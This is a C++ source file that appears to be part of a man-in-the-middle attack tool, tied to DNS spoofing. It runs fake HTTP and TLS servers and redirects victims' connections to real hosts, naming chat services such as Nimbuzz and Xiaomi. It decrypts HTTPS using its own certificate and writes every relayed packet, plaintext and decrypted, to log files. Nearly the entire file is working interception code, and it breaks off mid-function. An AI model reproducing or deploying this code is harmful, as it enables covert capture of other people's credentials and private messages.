


#include "MidInMan.h"
#include "DNSAttact.h"
#include "pubvar.h"



#pragma comment ( lib, "libeay32.lib" )
#pragma comment ( lib, "ssleay32.lib" )
#pragma comment ( lib, "user32.lib")
#pragma comment ( lib, "ws2_32.lib")



#define HTTP_LOCAL_PORT		65535
#define SSL_LOCAL_PORT		65534



int GetRealIPFromHttpHost(unsigned char * ucBuffer,int iCounter,unsigned long * ulHostIp)
{
	char strHost[HTTP_HOST_LIMIT_LENGTH] = {0};
	char * pHostHdr = strstr((char*)ucBuffer,"\r\nHost: ");
	char * pHostEdr = 0;
	if (pHostHdr)
	{
		pHostHdr += strlen("\r\nHost: ");
		pHostEdr = strstr(pHostHdr,"\r\n");
		if (pHostEdr)
		{
			if( ( (pHostEdr - pHostHdr) > 0) && ((pHostEdr - pHostHdr) < HTTP_HOST_LIMIT_LENGTH) )
			{
				memmove(strHost,pHostHdr ,pHostEdr - pHostHdr);
				for (int i = 0; i < gDNSAttackList.GetSize(); i ++)
				{
					if (strstr(strHost,gDNSAttackList[i]))
					{
						*ulHostIp =  inet_addr(gDNSRealIPList[i]);
						return TRUE;
					}
				}
			}
		}
	}
	else if (memcmp((char*)ucBuffer,"<stream:",8) == 0)
	{
#ifdef _DEBUG
		printf("find nimbuzz <stream: head\n");
#endif
		if (strstr((char*)ucBuffer,"nimbuzz.com"))
		{
			#ifdef _DEBUG
			printf("find nimbuzz nimbuzz head\n");
			#endif
			for (int i = 0; i < gDNSAttackList.GetSize(); i ++)
			{
				if (strstr(gDNSAttackList[i].GetBuffer(0),"o.nimbuzz.com"))	//other is right?try it
				{
					*ulHostIp =  inet_addr(gDNSRealIPList[i]);
					return TRUE;
				}
			}
			#ifdef _DEBUG
			printf("not find elevant item in dns configuraiton file\n");
			#endif
		}
	}
	return FALSE;
}







int GetRealIPFromXmpp(unsigned char * ucBuffer,int iCounter,in_addr * iaToServer)
{
	char strHost[HTTP_HOST_LIMIT_LENGTH] = {0};
	char * pHostHdr = strstr((char*)ucBuffer,"xiaomi.com");
	char * pHostEdr = 0;
	if (pHostHdr)
	{
		for (int i = 0; i < gDNSAttackList.GetSize(); i ++)
		{
			if (strstr(gDNSAttackList[i],"fe.chat.mi.com"))
			{
				iaToServer->S_un.S_addr =  inet_addr(gDNSRealIPList[i]);
				return TRUE;
			}
		}
	}
	return FALSE;
}










SOCKET InitFakeServer(unsigned short usPort)
{
	SOCKET sockListen = socket(AF_INET,SOCK_STREAM,0);
	if(sockListen == INVALID_SOCKET)
	{
		printf("socket错误码%d\n",WSAGetLastError());
		return sockListen;
	}
	
	sockaddr_in saListen;
	saListen.sin_addr.S_un.S_addr	= INADDR_ANY;		// should be the same to g_ulFakeDestIP
	saListen.sin_family				= AF_INET;
	saListen.sin_port				= ntohs(usPort);			
	int iRet = bind(sockListen,(sockaddr*)&saListen,sizeof(sockaddr_in));
	if (iRet == SOCKET_ERROR)
	{
		closesocket(sockListen);
		printf("bind错误码%d\n",WSAGetLastError());
		return iRet;
	}
	
	iRet = listen(sockListen,LISTEN_MAX);
	if (iRet == SOCKET_ERROR)
	{
		closesocket(sockListen);
		printf("listen错误码%d\n",WSAGetLastError());
		return iRet;
	}
	
	return sockListen;
}





int HTTPListenThread()
{
	try
	{
		SOCKET sockListen = InitFakeServer(HTTP_PORT);
		if( (sockListen == SOCKET_ERROR) || (sockListen == INVALID_SOCKET) )
		{
			printf("HTTP监听线程初始化失败,原因可能是端口已经被绑定或者创建socket失败或者监听函数失败\n");
			return FALSE;
		}
		else
		{
			printf("HTTP监听线程启动成功,正在监听客户机到本机的连接\n");
		}
		
		int iClientSockSize = sizeof(sockaddr_in);			                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;
		while (TRUE)
		{
			LPHTTPPROXYPARAM pstHttpProxyParam = new HTTPPROXYPARAM;
			pstHttpProxyParam->sockToClient = accept(sockListen,(sockaddr*)&pstHttpProxyParam->saToClient,&iClientSockSize);
			if (pstHttpProxyParam->sockToClient != INVALID_SOCKET)
			{
				printf("HTTP监听线程接收一个新的连接,IP地址:%s,端口:%d\n",
					inet_ntoa(pstHttpProxyParam->saToClient.sin_addr), ntohs(pstHttpProxyParam->saToClient.sin_port));
				
				pstHttpProxyParam->hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)HTTPProxy,pstHttpProxyParam,0,&pstHttpProxyParam->ulThreadID);
				if (pstHttpProxyParam->hThread)
				{
					CloseHandle(pstHttpProxyParam->hThread);
					printf("HTTP监听线程创建客户端代理线程,线程句柄:%u:,线程ID:%u\n",pstHttpProxyParam->hThread,pstHttpProxyParam->ulThreadID);
					continue;
				}
				else
				{
					closesocket(pstHttpProxyParam->sockToClient);
					delete pstHttpProxyParam;
					printf("HTTP监听线程创建客户端代理线程失败\n");	
				}	
			}
			else
			{
				delete pstHttpProxyParam;
				printf("HTTP监听线程accept错误码:%d\n",WSAGetLastError());
				continue;
			}
		}	
	}
	catch (...)
	{
		char strError[256] = {0};
		SYSTEMTIME stSysTm;
		GetLocalTime(&stSysTm);
		sprintf(strError, "HTTP监听线程发生异常,错误码:%u,时间:%d.%d.%d %d:%d:%d\r\n",GetLastError(),
			stSysTm.wYear,stSysTm.wMonth,stSysTm.wDay,stSysTm.wHour,stSysTm.wMinute,stSysTm.wSecond);
		printf("%s",strError);
		RecordInFile(LOG_FILE,(unsigned char *)strError,strlen(strError));
		getchar();
		return FALSE;	
	}
}







int HTTPProxy(LPHTTPPROXYPARAM pstHttpProxyParam)
{
	int				iCounter				= 0;
	int				iRet					= 0;
	unsigned char	ucBuffer[MAX_PACKET_SIZE]	= {0};

	try
	{
		iCounter = recv(pstHttpProxyParam->sockToClient,(char*)ucBuffer,MAX_PACKET_SIZE,0);		
		if( (iCounter == SOCKET_ERROR) || (iCounter == 0) )
		{
			closesocket(pstHttpProxyParam->sockToClient);
			delete pstHttpProxyParam;
			printf("HTTP代理线程socket关闭或者recv接收数据包失败,错误码:%d\n",WSAGetLastError());
			return FALSE;
		}
		*(ucBuffer + iCounter) = 0;
		iRet = RecordInFile(HTTP_PROXY_FILE,ucBuffer,iCounter);

		unsigned long ulHostIp;
		iRet = GetRealIPFromHttpHost(ucBuffer, iCounter, &ulHostIp);
		if( (iRet) && (ulHostIp) )
		{
			pstHttpProxyParam->saToServer.sin_addr.S_un.S_addr = ulHostIp;
			pstHttpProxyParam->saToServer.sin_port = ntohs(HTTP_PORT);
			pstHttpProxyParam->saToServer.sin_family = AF_INET;

			pstHttpProxyParam->sockToServer = socket(AF_INET,SOCK_STREAM,0);
			if (pstHttpProxyParam->sockToServer == INVALID_SOCKET)
			{
				closesocket(pstHttpProxyParam->sockToClient);
				delete pstHttpProxyParam;
				printf("HTTP代理线程socket错误码:%d\n",WSAGetLastError());
				return FALSE;
			}

			iRet = connect(pstHttpProxyParam->sockToServer,(sockaddr*)&(pstHttpProxyParam->saToServer),sizeof(sockaddr_in) );
			if (iRet == SOCKET_ERROR )
			{
				closesocket(pstHttpProxyParam->sockToClient);
				closesocket(pstHttpProxyParam->sockToServer);
				delete pstHttpProxyParam;
				printf("HTTP客户端代理线程connect错误码:%d\n",WSAGetLastError());
				return FALSE;
			}
			
			iRet = send(pstHttpProxyParam->sockToServer,(char*)ucBuffer,iCounter,0);
			if( (iRet == SOCKET_ERROR) || (iRet != iCounter) || ( iRet == 0))
			{
				closesocket(pstHttpProxyParam->sockToClient);
				closesocket(pstHttpProxyParam->sockToServer);
				delete pstHttpProxyParam;
				printf("HTTP代理线程连接socket被关闭或者send错误码:%d\n",WSAGetLastError());
				return FALSE;
			}

			fd_set			stFdSet;
			timeval			stTmVal;
			stTmVal.tv_sec	= 0;
			stTmVal.tv_usec = TV_USEC_VALUE;
			while (TRUE)
			{
				FD_ZERO( &stFdSet );
				FD_SET( pstHttpProxyParam->sockToClient, &stFdSet );
				FD_SET( pstHttpProxyParam->sockToServer, &stFdSet );	
				iRet = select( 0, &stFdSet, NULL, NULL, &stTmVal );
				if( iRet == SOCKET_ERROR ) 
				{
					closesocket(pstHttpProxyParam->sockToServer);
					closesocket(pstHttpProxyParam->sockToClient);
					delete pstHttpProxyParam;
					printf("HTTP代理线程select错误码:%d\n",WSAGetLastError());
					return FALSE;
				}
				else if( iRet == 0 )
				{
					continue;
				}
				
				if( FD_ISSET( pstHttpProxyParam->sockToClient, &stFdSet ) )
				{
					iCounter = recv(pstHttpProxyParam->sockToClient,(char*)ucBuffer,MAX_PACKET_SIZE,0);	
					if( (iCounter == SOCKET_ERROR) || (iCounter == 0) )
					{
						closesocket(pstHttpProxyParam->sockToServer);
						closesocket(pstHttpProxyParam->sockToClient);
						delete pstHttpProxyParam;
						printf("HTTP代理线程socket关闭或者recv接收数据包失败,错误码:%d\n",WSAGetLastError());
						return FALSE;
					}	

					*(ucBuffer + iCounter) = 0;
					iRet = RecordInFile(HTTP_PROXY_FILE,ucBuffer,iCounter);

					iRet = send(pstHttpProxyParam->sockToServer,(char*)ucBuffer,iCounter,0);
					if( ( iRet == SOCKET_ERROR ) || (iRet != iCounter) || (iRet == 0))
					{
						closesocket(pstHttpProxyParam->sockToServer);
						closesocket(pstHttpProxyParam->sockToClient);
						delete pstHttpProxyParam;
						printf("HTTP代理线程连接socket被关闭或者send错误码:%d\n",WSAGetLastError());
						return FALSE;
					}
				}
				
				if( FD_ISSET( pstHttpProxyParam->sockToServer, &stFdSet ) )
				{
					iCounter = recv(pstHttpProxyParam->sockToServer,(char*)ucBuffer,MAX_PACKET_SIZE,0);	
					if( (iCounter == SOCKET_ERROR) || (iCounter == 0) )
					{
						closesocket(pstHttpProxyParam->sockToServer);
						closesocket(pstHttpProxyParam->sockToClient);
						delete pstHttpProxyParam;
						printf("HTTP代理线程socket关闭或者recv接收数据包失败,错误码:%d\n",WSAGetLastError());
						return FALSE;
					}	

					*(ucBuffer + iCounter) = 0;
					iRet = RecordInFile(HTTP_PROXY_FILE,ucBuffer,iCounter);
					
					iRet = send(pstHttpProxyParam->sockToClient,(char*)ucBuffer,iCounter,0);
					if( (iRet == SOCKET_ERROR) || (iRet != iCounter) || ( iRet == 0))
					{
						closesocket(pstHttpProxyParam->sockToServer);
						closesocket(pstHttpProxyParam->sockToClient);
						delete pstHttpProxyParam;
						printf("HTTP代理线程连接socket被关闭或者send错误码:%d\n",WSAGetLastError());
						return FALSE;
					}
				}
			}	
		}
		else
		{
			closesocket(pstHttpProxyParam->sockToClient);
			delete pstHttpProxyParam;
			printf("HTTP客户端代理接收到不明软件的数据包\n");
			return FALSE;
		}
	}
	catch (...)
	{
		char strError[256];
		SYSTEMTIME stSysTm;
		GetLocalTime(&stSysTm);
		sprintf(strError, "HTTP客户端代理线程发生异常,错误码:%u,线程ID:%u,线程句柄:%u,时间:%d.%d.%d %d:%d:%d\r\n",GetLastError(),
			pstHttpProxyParam->ulThreadID,pstHttpProxyParam->hThread,
			stSysTm.wYear,stSysTm.wMonth,stSysTm.wDay,stSysTm.wHour,stSysTm.wMinute,stSysTm.wSecond);
		printf("%s",strError);
		RecordInFile(LOG_FILE,(unsigned char *)strError,strlen(strError));
		return FALSE;
	}
}








int SSLListenThread()
{

	try
	{
		SOCKET sockListen = InitFakeServer(SSL_PORT);
		if( (sockListen == SOCKET_ERROR) || (sockListen == INVALID_SOCKET) )
		{
			printf("SSL监听线程初始化失败,原因可能是端口已经被绑定或者创建socket失败或者监听函数失败\n");
			return FALSE;
		}
		else
		{
			printf("SSL监听线程启动成功,正在监听客户机到本机的连接\n");
		}


		SSL_library_init( );				
		OpenSSL_add_all_algorithms();
		ERR_load_BIO_strings();
 		SSL_load_error_strings( );

		
		int iClientSockSize = sizeof(sockaddr_in);	
		while (TRUE)
		{
			LPSSLPROXYPARAM pstSSLProxyParam = new SSLPROXYPARAM;
			pstSSLProxyParam->sockToClient = accept(sockListen,(sockaddr*)&(pstSSLProxyParam->saToClient),&iClientSockSize);
			if( (pstSSLProxyParam->sockToClient != INVALID_SOCKET) && (iClientSockSize == sizeof(sockaddr_in)) )
			{
				printf("SSL监听线程接收一个新的连接,IP地址:%s,端口号:%u\n",
					inet_ntoa(pstSSLProxyParam->saToClient.sin_addr), ntohs(pstSSLProxyParam->saToClient.sin_port));

				pstSSLProxyParam->ctxToClient = SSL_CTX_new( SSLv23_server_method() );	
				if( pstSSLProxyParam->ctxToClient == 0 )
				{
					closesocket(pstSSLProxyParam->sockToClient);
					delete pstSSLProxyParam;
					printf("SSL监听线程SSL_CTX_new错误\n");
					continue;
				}
				else
				{
					printf("SSL监听线程 SSL_CTX_new ok\n");
				}

				int iRet = 0;
				
				
				SSL_CTX_set_verify(pstSSLProxyParam->ctxToClient,SSL_VERIFY_PEER,0);	//伪装服务器不需要验证客户端

				/*
				iRet = SSL_CTX_load_verify_locations(pstSSLProxyParam->ctxToClient,ROOT_CERT_FILE,0);
				if (iRet != 1)
				{
					SSL_CTX_free(pstSSLProxyParam->ctxToClient);
					closesocket(pstSSLProxyParam->sockToClient);
					delete pstSSLProxyParam;
					printf( "SSL监听线程SSL_CTX_load_verify_locations错误\n");
					continue;
				}
				else
				{
					printf("SSL监听线程 SSL_CTX_load_verify_locations ok\n");
				}
				*/
				
				SSL_CTX_set_default_passwd_cb_userdata( pstSSLProxyParam->ctxToClient, PRIVATE_KEY_PWD );
				iRet = SSL_CTX_use_certificate_file( pstSSLProxyParam->ctxToClient, CERT_FILE, SSL_FILETYPE_PEM );
				if(  iRet <= 0 )
				{
					
					SSL_CTX_free(pstSSLProxyParam->ctxToClient);
					closesocket(pstSSLProxyParam->sockToClient);
					delete pstSSLProxyParam;
					printf( "SSL监听线程SSL_CTX_use_certificate_file错误\n");
					continue;
				}
				else
				{
					printf("SSL监听线程 SSL_CTX_use_certificate_file ok\n");
				}
				iRet = SSL_CTX_use_PrivateKey_file( pstSSLProxyParam->ctxToClient, KEY_FILE, SSL_FILETYPE_PEM );
				if( iRet <= 0 )
				{
					SSL_CTX_free(pstSSLProxyParam->ctxToClient);
					closesocket(pstSSLProxyParam->sockToClient);
					delete pstSSLProxyParam;
					printf("SSL监听线程SSL_CTX_use_certificate_file错误\n");
					continue;
				}
				else
				{
					printf("SSL监听线程 SSL_CTX_use_PrivateKey_file ok\n");
				}
				iRet = SSL_CTX_check_private_key( pstSSLProxyParam->ctxToClient );
				if( iRet  == 0)
				{
					SSL_CTX_free(pstSSLProxyParam->ctxToClient);
					closesocket(pstSSLProxyParam->sockToClient);
					delete pstSSLProxyParam;
					printf( "SSL监听线程Private key does not match the certificate public key\n" );
					continue;
				}
				else
				{
					printf("SSL监听线程 SSL_CTX_check_private_key ok\n");
				}
				pstSSLProxyParam->SSLToClient = SSL_new(pstSSLProxyParam->ctxToClient);
				if( pstSSLProxyParam->SSLToClient == 0)
				{
					
					SSL_CTX_free(pstSSLProxyParam->ctxToClient);
					closesocket(pstSSLProxyParam->sockToClient);
					delete pstSSLProxyParam;
					printf("SSL监听线程SSL_new错误\n");
					continue;
				}
				else
				{
					printf("SSL监听线程 SSL_new ok\n");
				}

				
				iRet = SSL_set_fd(pstSSLProxyParam->SSLToClient,pstSSLProxyParam->sockToClient);
				if (iRet != 1)
				{
					SSL_free(pstSSLProxyParam->SSLToClient);
					SSL_CTX_free(pstSSLProxyParam->ctxToClient);
					closesocket(pstSSLProxyParam->sockToClient);
					
					printf( "SSL_set_fd错误码:%d,错误描述:%s,函数返回值:%d\n" ,SSL_get_error(pstSSLProxyParam->SSLToClient,iRet),
						SSL_state_string_long(pstSSLProxyParam->SSLToClient),iRet);
					delete pstSSLProxyParam;
					continue;
				}
				else
				{
					printf("SSL监听线程 SSL_set_fd ok\n");
				}
				

				iRet = SSL_accept( pstSSLProxyParam->SSLToClient );		
				if( iRet != 1 )
				{

					
					printf( "SSL_accept错误码:%d,错误描述:%s,函数返回值:%d\n" ,SSL_get_error(pstSSLProxyParam->SSLToClient,iRet),
						SSL_state_string_long(pstSSLProxyParam->SSLToClient),iRet);
					SSL_free(pstSSLProxyParam->SSLToClient);
					SSL_CTX_free(pstSSLProxyParam->ctxToClient);					
					closesocket(pstSSLProxyParam->sockToClient);
					delete pstSSLProxyParam;	//先输出日志再删除 否则异常
					continue;
				}
				else
				{
					printf("SSL监听线程 SSL_accept ok\n");
				}

						/*
						unsigned char	ucBuffer[MAX_PACKET_SIZE]	= {0};
						int iCounter = SSL_read(pstSSLProxyParam->SSLToClient,ucBuffer,MAX_PACKET_SIZE);
						if (iCounter > 1)
						{
							printf("ssl read read count bigger than one!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\n");

						}
						*/

				pstSSLProxyParam->hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)SSLProxy,pstSSLProxyParam,0,&(pstSSLProxyParam->ulThreadID));
				if (pstSSLProxyParam->hThread == 0)
				{
					SSL_shutdown(pstSSLProxyParam->SSLToClient);
					SSL_free(pstSSLProxyParam->SSLToClient);
					SSL_CTX_free(pstSSLProxyParam->ctxToClient);
					closesocket(pstSSLProxyParam->sockToClient);
					delete pstSSLProxyParam;
					printf("SSL创建代理线程失败,错误码:%d\n",GetLastError());
					continue;
				}
				else
				{
					CloseHandle( pstSSLProxyParam->hThread );
					printf("SSL监听线程创建代理线程,线程句柄:%u: 线程ID:%u\n",pstSSLProxyParam->hThread,pstSSLProxyParam->ulThreadID);
					continue;
				}	
			}
			else
			{
				delete pstSSLProxyParam;
				printf( "SSL监听线程accept错误码:%d\n",WSAGetLastError());	
				continue;
			}
		}
	}
	catch (...)
	{
		char strError[256] = {0};
		SYSTEMTIME stSysTm;
		GetLocalTime(&stSysTm);
		sprintf(strError, "SSL监听线程发生异常,错误码:%u,时间:%d.%d.%d %d:%d:%d\r\n",WSAGetLastError(),
			stSysTm.wYear,stSysTm.wMonth,stSysTm.wDay,stSysTm.wHour,stSysTm.wMinute,stSysTm.wSecond);
		printf("%s",strError);
		RecordInFile(LOG_FILE,(unsigned char *)strError,strlen(strError));
		return FALSE;	
	}
}










int	SSLProxy(LPSSLPROXYPARAM pstSSLProxyParam)
{
	int				iCounter				= 0;
	int				iRet					= 0;
	unsigned char	ucBuffer[MAX_PACKET_SIZE]	= {0};

	try
	{
		iCounter = SSL_read(pstSSLProxyParam->SSLToClient,ucBuffer,MAX_PACKET_SIZE);
		if ( iCounter <= 0 )			//if ret = 0, need to be further judgment
		{
			printf( "SSL代理SSL_read错误码:%d,错误描述:%s,函数返回值:%d\n" ,SSL_get_error(pstSSLProxyParam->SSLToClient,iCounter),
				SSL_state_string_long(pstSSLProxyParam->SSLToClient),iCounter);
			SSL_shutdown(pstSSLProxyParam->SSLToClient);
			SSL_free(pstSSLProxyParam->SSLToClient);
			SSL_CTX_free(pstSSLProxyParam->ctxToClient);
			closesocket(pstSSLProxyParam->sockToClient);
			delete pstSSLProxyParam;
			return FALSE;
		}


		*(ucBuffer + iCounter) = 0;
		iRet = RecordInFile(SSL_PROXY_FILE,ucBuffer,iCounter);		
		
		unsigned long ulHostIp = 0;
		iRet = GetRealIPFromHttpHost(ucBuffer,iCounter,&ulHostIp);
		if( (iRet) && (ulHostIp) )
		{
			pstSSLProxyParam->saToServer.sin_addr.S_un.S_addr = ulHostIp;
			pstSSLProxyParam->saToServer.sin_family = AF_INET;
			pstSSLProxyParam->saToServer.sin_port = htons( SSL_PORT );

			pstSSLProxyParam->sockToServer = socket( AF_INET, SOCK_STREAM, 0 );
			if( pstSSLProxyParam->sockToServer == INVALID_SOCKET )
			{
				SSL_shutdown(pstSSLProxyParam->SSLToClient);
				SSL_free(pstSSLProxyParam->SSLToClient);
				SSL_CTX_free(pstSSLProxyParam->ctxToClient);
				closesocket(pstSSLProxyParam->sockToClient);
				delete pstSSLProxyParam;
				printf("SSL代理socket错误码:%d",WSAGetLastError());
				return FALSE;
			}
			
			iRet = connect( pstSSLProxyParam->sockToServer, (struct sockaddr *)&(pstSSLProxyParam->saToServer), sizeof(sockaddr_in) );
			if( iRet == SOCKET_ERROR )
			{
				SSL_shutdown(pstSSLProxyParam->SSLToClient);
				SSL_free(pstSSLProxyParam->SSLToClient);
				SSL_CTX_free(pstSSLProxyParam->ctxToClient);
				closesocket(pstSSLProxyParam->sockToClient);
				closesocket(pstSSLProxyParam->sockToServer);
				delete pstSSLProxyParam;
				printf("SSL代理connect错误码:%d",WSAGetLastError());
				return FALSE;
			}
					
			pstSSLProxyParam->ctxToServer = SSL_CTX_new( SSLv23_client_method() );
			if( pstSSLProxyParam->ctxToServer == 0 )
			{
				SSL_shutdown(pstSSLProxyParam->SSLToClient);
				SSL_free(pstSSLProxyParam->SSLToClient);
				SSL_CTX_free(pstSSLProxyParam->ctxToClient);
				closesocket(pstSSLProxyParam->sockToClient);
				closesocket(pstSSLProxyParam->sockToServer);
				delete pstSSLProxyParam;
				printf("SSL代理SSL_CTX_new错误\n");
				return FALSE;
			}
			pstSSLProxyParam->SSLToServer = SSL_new (pstSSLProxyParam->ctxToServer);
			if( pstSSLProxyParam->SSLToServer == 0 )
			{
				SSL_shutdown(pstSSLProxyParam->SSLToClient);
				SSL_free(pstSSLProxyParam->SSLToClient);
				SSL_CTX_free(pstSSLProxyParam->ctxToServer);
				SSL_CTX_free(pstSSLProxyParam->ctxToClient);
				closesocket(pstSSLProxyParam->sockToClient);
				closesocket(pstSSLProxyParam->sockToServer);
				delete pstSSLProxyParam;
				printf("SSL代理SSL_new错误\n");
				return FALSE;
			}	
			iRet = SSL_set_fd(pstSSLProxyParam->SSLToServer, pstSSLProxyParam->sockToServer);
			if (iRet != 1)
			{
				printf( "SSL代理SSL_set_fd错误码:%d,错误描述:%s,函数返回值:%d\n" ,SSL_get_error(pstSSLProxyParam->SSLToServer,iRet),
					SSL_state_string_long(pstSSLProxyParam->SSLToServer),iRet);
				SSL_shutdown(pstSSLProxyParam->SSLToClient);
				SSL_free(pstSSLProxyParam->SSLToClient);
				SSL_free(pstSSLProxyParam->SSLToServer);
				SSL_CTX_free(pstSSLProxyParam->ctxToServer);
				SSL_CTX_free(pstSSLProxyParam->ctxToClient);
				closesocket(pstSSLProxyParam->sockToClient);
				closesocket(pstSSLProxyParam->sockToServer);
				delete pstSSLProxyParam;
				return FALSE;
			}
			
			iRet = SSL_connect( pstSSLProxyParam->SSLToServer );
			if( iRet != 1)
			{
				printf( "SSL代理SSL_connect错误码:%d,错误描述:%s,函数返回值:%d\n" ,SSL_get_error(pstSSLProxyParam->SSLToServer,iRet),
					SSL_state_string_long(pstSSLProxyParam->SSLToServer),iRet);
				SSL_shutdown(pstSSLProxyParam->SSLToClient);
				SSL_free(pstSSLProxyParam->SSLToClient);
				SSL_free(pstSSLProxyParam->SSLToServer);
				SSL_CTX_free(pstSSLProxyParam->ctxToServer);
				SSL_CTX_free(pstSSLProxyParam->ctxToClient);
				closesocket(pstSSLProxyParam->sockToClient);
				closesocket(pstSSLProxyParam->sockToServer);
				delete pstSSLProxyParam;
				return FALSE;
			}


			iRet = SSL_write(pstSSLProxyParam->SSLToServer,ucBuffer,iCounter);
			if( (iRet <= 0) || (iRet != iCounter) )
			{
				printf( "SSL代理SSL_write错误码:%d,错误描述:%s,函数返回值:%d\n" ,SSL_get_error(pstSSLProxyParam->SSLToServer,iRet),
					SSL_state_string_long(pstSSLProxyParam->SSLToServer),iRet);
				SSL_shutdown(pstSSLProxyParam->SSLToServer);
				SSL_shutdown(pstSSLProxyParam->SSLToClient);
				SSL_free(pstSSLProxyParam->SSLToClient);
				SSL_free(pstSSLProxyParam->SSLToServer);
				SSL_CTX_free(pstSSLProxyParam->ctxToServer);
				SSL_CTX_free(pstSSLProxyParam->ctxToClient);
				closesocket(pstSSLProxyParam->sockToClient);
				closesocket(pstSSLProxyParam->sockToServer);
				delete pstSSLProxyParam;
				return FALSE;
			}
			
			fd_set	stFdSet;
			timeval	stTmVal;
			stTmVal.tv_sec	= 0;
			stTmVal.tv_usec	= TV_USEC_VALUE;
			while (TRUE)
			{
				FD_ZERO( &stFdSet );
				FD_SET( pstSSLProxyParam->sockToClient, &stFdSet );
				FD_SET( pstSSLProxyParam->sockToServer, &stFdSet );	
				iRet = select( 0, &stFdSet, NULL, NULL, &stTmVal );
				if( iRet == SOCKET_ERROR ) 
				{
					SSL_shutdown(pstSSLProxyParam->SSLToServer);
					SSL_shutdown(pstSSLProxyParam->SSLToClient);
					SSL_free(pstSSLProxyParam->SSLToClient);
					SSL_free(pstSSLProxyParam->SSLToServer);
					SSL_CTX_free(pstSSLProxyParam->ctxToServer);
					SSL_CTX_free(pstSSLProxyParam->ctxToClient);
					closesocket(pstSSLProxyParam->sockToClient);
					closesocket(pstSSLProxyParam->sockToServer);
					delete pstSSLProxyParam;
					printf("SSL代理线程select错误码:%d\n",WSAGetLastError());
					return FALSE;
				}
				else if( iRet == 0 )
				{
					continue;
				}
				
				if( FD_ISSET( pstSSLProxyParam->sockToServer, &stFdSet ) )
				{
					iCounter = SSL_read( pstSSLProxyParam->SSLToServer, (char *)ucBuffer, MAX_PACKET_SIZE );
					if( iCounter <= 0 )
					{
						printf( "SSL代理SSL_read错误码:%d,错误描述:%s,函数返回值:%d\n" ,SSL_get_error(pstSSLProxyParam->SSLToServer,iCounter),
							SSL_state_string_long(pstSSLProxyParam->SSLToServer),iCounter);
						SSL_shutdown(pstSSLProxyParam->SSLToServer);
						SSL_shutdown(pstSSLProxyParam->SSLToClient);
						SSL_free(pstSSLProxyParam->SSLToClient);
						SSL_free(pstSSLProxyParam->SSLToServer);
						SSL_CTX_free(pstSSLProxyParam->ctxToServer);
						SSL_CTX_free(pstSSLProxyParam->ctxToClient);
						closesocket(pstSSLProxyParam->sockToClient);
						closesocket(pstSSLProxyParam->sockToServer);
						delete pstSSLProxyParam;
						return FALSE;
					}
					
					*(ucBuffer + iCounter) = 0;
					char * httpspacketheader = "here is a new https packet:\r\n";
					iRet = RecordInFile(SSL_PROXY_FILE,(unsigned char *)httpspacketheader,strlen(httpspacketheader));
					iRet = RecordInFile(SSL_PROXY_FILE,ucBuffer,iCounter);
					
					iRet = SSL_write( pstSSLProxyParam->SSLToClient, (char *)ucBuffer, iCounter );
					if( ( iRet <= 0 ) || (iRet != iCounter) )
					{	
						printf( "SSL代理SSL_write错误码:%d,错误描述:%s,函数返回值:%d\n" ,SSL_get_error(pstSSLProxyParam->SSLToClient,iRet),
							SSL_state_string_long(pstSSLProxyParam->SSLToClient),iRet);
						SSL_shutdown(pstSSLProxyParam->SSLToServer);
						SSL_shutdown(pstSSLProxyParam->SSLToClient);
						SSL_free(pstSSLProxyParam->SSLToClient);
						SSL_free(pstSSLProxyParam->SSLToServer);
						SSL_CTX_free(pstSSLProxyParam->ctxToServer);
						SSL_CTX_free(pstSSLProxyParam->ctxToClient);
						closesocket(pstSSLProxyParam->sockToClient);
						closesocket(pstSSLProxyParam->sockToServer);
						delete pstSSLProxyParam;
						return FALSE;
					}
				}

				if( FD_ISSET( pstSSLProxyParam->sockToClient, &stFdSet ) )
				{
					iCounter = SSL_read( pstSSLProxyParam->SSLToClient, (char *)ucBuffer, MAX_PACKET_SIZE );
					if( iCounter <= 0 )
					{
						printf( "SSL代理SSL_read错误码:%d,错误描述:%s,函数返回值:%d\n" ,SSL_get_error(pstSSLProxyParam->SSLToClient,iCounter),
							SSL_state_string_long(pstSSLProxyParam->SSLToClient),iCounter);
						SSL_shutdown(pstSSLProxyParam->SSLToServer);
						SSL_shutdown(pstSSLProxyParam->SSLToClient);
						SSL_free(pstSSLProxyParam->SSLToClient);
						SSL_free(pstSSLProxyParam->SSLToServer);
						SSL_CTX_free(pstSSLProxyParam->ctxToServer);
						SSL_CTX_free(pstSSLProxyParam->ctxToClient);
						closesocket(pstSSLProxyParam->sockToClient);
						closesocket(pstSSLProxyParam->sockToServer);
						delete pstSSLProxyParam;
						return FALSE;
					}
					
					*(ucBuffer + iCounter) = 0;
					iRet = RecordInFile(SSL_PROXY_FILE,ucBuffer,iCounter);
					
					iRet = SSL_write( pstSSLProxyParam->SSLToServer, (char *)ucBuffer, iCounter );
					if( ( iRet < 0 ) || (iRet != iCounter) )
					{	
						printf( "SSL代理SSL_write错误码:%d,错误描述:%s,函数返回值:%d\n" ,SSL_get_error(pstSSLProxyParam->SSLToServer,iRet),
							SSL_state_string_long(pstSSLProxyParam->SSLToServer),iRet);
						SSL_shutdown(pstSSLProxyParam->SSLToServer);
						SSL_shutdown(pstSSLProxyParam->SSLToClient);
						SSL_free(pstSSLProxyParam->SSLToClient);
						SSL_free(pstSSLProxyParam->SSLToServer);
						SSL_CTX_free(pstSSLProxyParam->ctxToServer);
						SSL_CTX_free(pstSSLProxyParam->ctxToClient);
						closesocket(pstSSLProxyParam->sockToClient);
						closesocket(pstSSLProxyParam->sockToServer);
						delete pstSSLProxyParam;
						return FALSE;
					}
				}
			}
		}
		else
		{
			printf("SSL代理连接到不明的软件\n");
			SSL_shutdown(pstSSLProxyParam->SSLToClient);
			SSL_free(pstSSLProxyParam->SSLToClient);
			SSL_CTX_free(pstSSLProxyParam->ctxToClient);
			closesocket(pstSSLProxyParam->sockToClient);
			delete pstSSLProxyParam;
			return FALSE;
		}		
	}
	catch (...)
	{
		char strError[256];
		SYSTEMTIME stSysTm;
		GetLocalTime(&stSysTm);
		sprintf(strError, "SSL服务器端线程发生异常,错误码:%u,线程ID:%u,线程句柄:%u,时间:%d.%d.%d %d:%d:%d\r\n",GetLastError(),
			pstSSLProxyParam->ulThreadID,pstSSLProxyParam->hThread,
			stSysTm.wYear,stSysTm.wMonth,stSysTm.wDay,stSysTm.wHour,stSysTm.wMinute,stSysTm.wSecond);
		printf("%s",strError);
		RecordInFile(LOG_FILE,(unsigned char *)strError,strlen(strError));
		getchar();
